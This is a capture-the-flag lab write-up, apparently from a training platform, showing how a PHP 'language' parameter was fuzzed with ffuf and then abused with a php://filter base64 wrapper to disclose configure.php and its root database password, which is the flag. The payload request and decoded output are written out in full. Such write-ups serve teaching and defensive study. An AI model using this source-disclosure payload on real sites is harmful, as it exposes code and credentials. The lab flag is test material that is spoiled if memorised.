# PHP Filters - Lab Writeup

## [¤] Operation Log (Proof of Concept)

```yaml
Target Host: 154.57.164.78:30926
System/OS: Linux
Objective: Find the Flag
Vulnerability: PHP Filters (php://filter source code disclosure)
```

### 1. Reconnaissance & Foothold
- **Directory & File Fuzzing**:
  We ran directory fuzzing using `ffuf` to look for hidden or configuration files using the following command:
  ```bash
  ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://154.57.164.78:30926/FUZZ.php
  ```
  - **Results**:
    - `index` (Status: 200)
    - `en` / `es` (Status: 200)
    - `configure` (Status: 302) -> Pointing to a potential database/configuration script (`configure.php`).

- **Initial Access**:
  - Requesting `/index.php?language=configure` directly did not return any visible output or config information, as it was likely parsed and executed empty on the backend.

### 2. Exploitation (Retrieving PHP Files / Code Execution)
- **Source Code Disclosure via PHP Wrapper**:
  To view the contents of `configure.php` without executing it, we used the `php://filter` wrapper to encode the target file as base64 before it got rendered/executed:
  ```http
  GET /index.php?language=php://filter/read=convert.base64-encode/resource=configure HTTP/1.1
  ```
  - **Response Payload**:
    ```text
    PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0
    ```

- **Decoding Content**:
  We decoded the base64 string using CyberChef (or `echo <base64> | base64 -d`), which yielded the following PHP configuration:
  ```php
  <?php

  if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('HTTP/1.0 403 Forbidden', TRUE, 403);
    die(header('location: /index.php'));
  }

  $config = array(
    'DB_HOST' => 'db.inlanefreight.local',
    'DB_USERNAME' => 'root',
    'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
    'DB_DATABASE' => ...
  ```

### 3. Post-Mortem & Flag
* **Flag**: `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`
* **Lessons Learned**:
  - PHP execution endpoints (like `include()`) can be forced to return raw source code by wrapping the stream with `php://filter/read=convert.base64-encode/resource=<filename>`.
  - Sensitive files like configuration files (e.g. `configure.php`) that do not render visible HTML output when executed are primary targets for source disclosure wrappers.

